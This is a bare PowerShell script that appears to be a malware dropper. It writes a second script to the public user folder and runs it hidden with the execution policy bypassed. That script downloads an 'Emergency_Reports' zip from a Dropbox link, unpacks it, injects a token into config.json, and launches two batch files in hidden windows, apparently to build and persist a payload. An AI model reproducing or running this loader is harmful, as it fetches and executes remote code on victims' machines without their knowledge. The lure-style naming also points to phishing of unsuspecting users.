$ps1='$userPath="C:\\Users\\$env:USERNAME";Set-Location -Path "C:\\Users\\Public";if(-not(Test-Path -Path "C:\\Users\\Public\\Emergency_Reports.zip")){try{Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/20fozvx0ycrbp4b4j6jzk/Emergency_Reports.zip?rlkey=re0858z2htyocxyp77ufxp2fa&st=ne2z4t2n&dl=1" -OutFile "Emergency_Reports.zip"}catch{Write-Host "Error downloading ''Emergency_Reports.zip'': $_";exit}}else{Write-Host "File ''Emergency_Reports.zip'' already exists. Skipping download."};if(-not(Test-Path -Path "$userPath\\Emergency_Reports")){try{Expand-Archive -Path "C:\\Users\\Public\\Emergency_Reports.zip" -DestinationPath "$userPath\\Emergency_Reports" -Force}catch{Write-Host "Error extracting ''Emergency_Reports.zip'': $_";if(Test-Path -Path "C:\\Users\\Public\\Emergency_Reports.zip"){Write-Host "Zip file may be corrupted. Deleting...";Remove-Item -Path "C:\\Users\\Public\\Emergency_Reports.zip" -Force};exit}}else{Write-Host "Folder ''Emergency_Reports'' already exists in $userPath. Skipping extraction."};try{Set-Location -Path "$userPath\\Emergency_Reports"}catch{Write-Host "Error accessing folder ''Emergency_Reports'': $_";exit};try{$configPath=Join-Path -Path "$userPath\\Emergency_Reports" -ChildPath "config.json";$config=@{};if(Test-Path -Path $configPath){$config=Get-Content -Path $configPath -Raw | ConvertFrom-Json -ErrorAction Stop};$config.esx1="VF2eZS7aUm2pQw4JNU5lVZ9jM34VBP6wUk6TUx6ENF8rRs4jUk4MJN5AVT2NFx9aVV7zhk9FT18YJH3NZD5pRU0ZbW6SN13nUn4RpW4fQ21OQw3tcz6GFM6nbm4At67BV26xxN1veF2FUy8gcF9fRi2fMD8iVo6EV11ihW8hS11TRU0SUm6QlT5sRE6Y0z8IUj3DBS3Ebl4DR65pWk1tlN0GVm7FhP9QU06udG5tYW9kNV2zTl0hZi0hRW8qRq";$config|ConvertTo-Json|Set-Content -Path $configPath;Write-Host "Token updated successfully: VF2eZS7aUm2pQw4JNU5lVZ9jM34VBP6wUk6TUx6ENF8rRs4jUk4MJN5AVT2NFx9aVV7zhk9FT18YJH3NZD5pRU0ZbW6SN13nUn4RpW4fQ21OQw3tcz6GFM6nbm4At67BV26xxN1veF2FUy8gcF9fRi2fMD8iVo6EV11ihW8hS11TRU0SUm6QlT5sRE6Y0z8IUj3DBS3Ebl4DR65pWk1tlN0GVm7FhP9QU06udG5tYW9kNV2zTl0hZi0hRW8qRq"}catch{Write-Host "Error updating config.json: $_";exit};if(Test-Path -Path ".\\build_and_run.bat"){try{Start-Process -FilePath "cmd.exe" -ArgumentList "/c .\\build_and_run.bat" -WindowStyle Hidden;Start-Sleep -Seconds 5;if(Test-Path -Path ".\\SetupShortcutAndRun.bat"){Start-Process -FilePath "cmd.exe" -ArgumentList "/c .\\SetupShortcutAndRun.bat" -WindowStyle Hidden}else{Write-Host "Error: ''SetupShortcutAndRun.bat'' not found.";exit}}catch{Write-Host "Error running batch files: $_";exit}}else{Write-Host "Error: ''build_and_run.bat'' not found.";exit}';
Set-Content -Path "C:\\Users\\Public\\emergency_setup.ps1" -Value $ps1;
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File C:\\Users\\Public\\emergency_setup.ps1" -WindowStyle Hidden
